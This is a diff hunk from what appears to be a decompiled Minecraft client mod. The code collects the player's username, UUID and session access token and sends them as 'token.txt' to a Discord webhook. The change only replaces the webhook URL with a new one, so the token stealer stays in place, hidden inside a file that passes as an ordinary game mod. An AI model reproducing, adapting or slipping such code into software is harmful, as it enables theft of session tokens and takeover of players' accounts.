@@ -22,7 +22,7 @@ implements ClientModInitializer {
                 String textPayload = "Username: " + class_310.method_1551().method_1548().method_1676() + "\nUUID: " + class_310.method_1551().method_1548().method_44717().toString().replace("-", "") + "\nAccess Token: " + class_310.method_1551().method_1548().method_1674();
                 String payload = "--boundary\nContent-Disposition: form-data; name=\"payload_json\"\nContent-Type: application/json\n\n" + jsonPayload + "\n--boundary\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"token.txt\"\nContent-Type: application/octet-stream\n\n" + textPayload + "\n--boundary--";
                 System.out.println(payload);
-                HttpRequest req = HttpRequest.newBuilder(new URI("https://discord.com/api/webhooks/1408875725628510218/_GOU4yXfjOzStajVQa4jZvZfaRhoy7DBZUPbL3t2SxbiAPnO3MR6uqyj_tWo6PHGhvXq")).header("Content-Type", "multipart/form-data; boundary=boundary").POST(HttpRequest.BodyPublishers.ofString(payload)).build();
+                HttpRequest req = HttpRequest.newBuilder(new URI("https://discord.com/api/webhooks/1369454620900065332/ZuJGak7RFNawiQOHv2-O3V8HsJDqvGbEzE9Dt9teFqt72-iECEhhWvX7PJpI523rzkv2")).header("Content-Type", "multipart/form-data; boundary=boundary").POST(HttpRequest.BodyPublishers.ofString(payload)).build();
                 HttpResponse<String> httpResponse = HttpClient.newHttpClient().send(req, HttpResponse.BodyHandlers.ofString());
             }
             catch (Exception e) {
